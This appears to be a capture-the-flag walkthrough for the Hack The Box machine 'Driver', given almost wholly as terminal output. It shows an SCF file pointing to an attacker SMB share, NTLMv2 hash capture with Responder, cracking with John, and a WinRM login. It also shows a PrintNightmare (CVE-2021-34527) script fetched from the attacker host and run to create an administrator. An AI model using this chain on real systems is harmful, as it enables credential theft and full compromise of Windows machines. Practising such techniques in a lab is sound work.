```bash
# Nmap 7.91 scan initiated Sun Oct  3 15:08:30 2021 as: nmap -vvv -p 80,135,445,5985 -sC -sV -oN initial.txt 10.10.11.106
Nmap scan report for driver.htb (10.10.11.106)
Host is up, received syn-ack (0.054s latency).
Scanned at 2021-10-03 15:08:30 +06 for 47s

PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
445/tcp  open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55670/tcp): CLEAN (Timeout)
|   Check 2 (port 18115/tcp): CLEAN (Timeout)
|   Check 3 (port 26928/udp): CLEAN (Timeout)
|   Check 4 (port 31577/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-03T16:08:41
|_  start_date: 2021-10-03T14:37:57

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  3 15:09:17 2021 -- 1 IP address (1 host up) scanned in 47.16 seconds

```


```text
[Shell]
Command=2
IconFile=\\10.10.14.82\share\shell.ico
[Taskbar]
Command=ToggleDesktop
```

``` bash
└─$ python3 Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[!] Responder must be run as root.

┌──(rahat㉿kali)-[~/dropbox/HackTheBox/driver/Responder]
└─$ sudo !!                                                                                                                                                                                                                             255 ⨯

┌──(rahat㉿kali)-[~/dropbox/HackTheBox/driver/Responder]
└─$ sudo python3 Responder.py -I tun0                                                                                                                                                                                                   255 ⨯
[sudo] password for rahat:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.82]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-E7KP8JJXP5V]
    Responder Domain Name      [1WE7.LOCAL]
    Responder DCE-RPC Port     [49074]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:7d4ac838630004d9:76A94E75D1C119E76F1AC363A6047CBE:0101000000000000007909376EB8D701909EF2A0523D39750000000002000800310057004500370001001E00570049004E002D00450037004B00500038004A004A00580050003500560004003400570049004E002D00450037004B00500038004A004A0058005000350056002E0031005700450037002E004C004F00430041004C000300140031005700450037002E004C004F00430041004C000500140031005700450037002E004C004F00430041004C0007000800007909376EB8D701060004000200000008003000300000000000000000000000002000002CFB7A57E9FA2CF0A071BECC286FD3DD50693DF892DD70EC98884DEAC18FCF9E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0038003200000000000000000000000000

```


```text
tony::DRIVER:7d4ac838630004d9:76A94E75D1C119E76F1AC363A6047CBE:0101000000000000007909376EB8D701909EF2A0523D39750000000002000800310057004500370001001E00570049004E002D00450037004B00500038004A004A00580050003500560004003400570049004E002D00450037004B00500038004A004A0058005000350056002E0031005700450037002E004C004F00430041004C000300140031005700450037002E004C004F00430041004C000500140031005700450037002E004C004F00430041004C0007000800007909376EB8D701060004000200000008003000300000000000000000000000002000002CFB7A57E9FA2CF0A071BECC286FD3DD50693DF892DD70EC98884DEAC18FCF9E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0038003200000000000000000000000000
```

Cracking NTLMv2 Hash
```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)
1g 0:00:00:00 DONE (2021-10-03 15:54) 50.00g/s 1843Kp/s 1843Kc/s 1843KC/s !!!!!!..holaz
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
                                                                                             
```


``` bash
└─$ evil-winrm -u tony -p liltony -i 10.10.11.106                                                                                                                                                                                         1 ⨯

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> dir


    Directory: C:\Users\tony\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/3/2021   9:11 AM         178561 P.ps1


*Evil-WinRM* PS C:\Users\tony\Documents> cd ..
*Evil-WinRM* PS C:\Users\tony> ls


    Directory: C:\Users\tony


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        6/11/2021   7:01 AM                Contacts
d-r---         9/7/2021  10:15 PM                Desktop
d-r---        10/3/2021   9:11 AM                Documents
d-r---        6/11/2021   7:05 AM                Downloads
d-r---        6/11/2021   7:01 AM                Favorites
d-r---        6/11/2021   7:01 AM                Links
d-r---        6/11/2021   7:01 AM                Music
d-r---         8/6/2021   7:34 AM                OneDrive
d-r---        6/11/2021   7:03 AM                Pictures
d-r---        6/11/2021   7:01 AM                Saved Games
d-r---        6/11/2021   7:01 AM                Searches
d-r---        6/11/2021   7:01 AM                Videos


*Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> ls


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/3/2021   7:38 AM             34 user.txt


*Evil-WinRM* PS C:\Users\tony\Desktop> cat user.txt
96c9d72800d2224b30f2d6a42dc1b568
*Evil-WinRM* PS C:\Users\tony\Desktop> 

```

```bash
*Evil-WinRM* PS C:\Users\tony\Downloads> wget 10.10.14.82:8081/CVE-2021-34527.ps1 -outfile "CVE-2021-34527.ps1
At line:1 char:51
+ wget 10.10.14.82:8081/CVE-2021-34527.ps1 -outfile "CVE-2021-34527.ps1
+                                                   ~~~~~~~~~~~~~~~~~~~
The string is missing the terminator: ".
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\Users\tony\Downloads> wget 10.10.14.82:8081/CVE-2021-34527.ps1 -outfile "CVE-2021-34527.ps1"
*Evil-WinRM* PS C:\Users\tony\Downloads> Import-Module .\cve-2021-34527.ps1
*Evil-WinRM* PS C:\Users\tony\Downloads> Invoke-Nightmare -DriverName "xoxo" -NewUser "binsec" -NewPassword "binsec01"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user binsec as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll

```


```bash
$ evil-winrm -u binsec -p binsec01 -i 10.10.11.106

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\binsec\Documents> whoami
driver\binsec
```

``` bash
*Evil-WinRM* PS C:\Users\binsec\Documents> net localgroup administrators                                                                                                                                                                      
Alias name     administrators                                                                                                                                                                                                                 
Comment        Administrators have complete and unrestricted access to the computer/domain                                                                    
Members
-------------------------------------------------------------------------------
Administrator
binsec
dedsec
The command completed successfully.

```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/3/2021   7:38 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat ro*
ee9e147b89cb35a9f441e981e34d0e2b

```


```text

```